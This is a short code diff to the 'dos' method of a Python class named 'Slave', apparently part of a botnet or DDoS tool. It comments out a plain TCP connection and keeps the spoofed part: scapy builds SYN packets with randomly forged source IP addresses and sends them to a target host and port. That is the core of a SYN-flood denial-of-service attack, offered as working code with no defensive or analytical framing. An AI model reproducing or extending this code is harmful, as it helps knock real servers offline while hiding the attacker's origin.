@@ -45,13 +45,13 @@ class Slave():
 
     def dos(self, host, port):
         try:
-            self.ddos = socket(AF_INET, SOCK_STREAM)
-            self.ddos.connect((host, port))
+            #self.ddos = socket(AF_INET, SOCK_STREAM)
+            #self.ddos.connect((host, port))
             #self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
             #IP Spoof
-            newSocket = scapy.StreamSocket(self.ddos)
+            #newSocket = scapy.StreamSocket(self.ddos)
             source = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-            spoofed_SYN =scapy.IP(dst=host,src=source)/scapy.TCP(dport=port,sport=22,flags='S', seq=10000)
+            spoofed_SYN =scapy.IP(dst=host,src=source)/scapy.TCP(dport=port,flags='S') / "HELLO"
             print spoofed_SYN
             scapy.send(spoofed_SYN)
             # syn_ack= scapy.srp1(spoofed_SYN)
